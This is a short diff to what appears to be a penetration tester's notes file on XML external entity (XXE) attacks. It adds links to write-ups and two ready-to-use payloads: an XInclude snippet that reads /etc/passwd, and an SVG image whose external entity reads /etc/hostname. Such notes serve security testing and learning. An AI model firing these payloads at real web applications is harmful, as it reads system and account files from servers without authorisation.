@@ -10,3 +10,10 @@ PT - 4
 https://www.gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php
 nice write ups:
 http://nerdint.blogspot.com/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html
+
+xinclude xxe:
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+image svg:
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
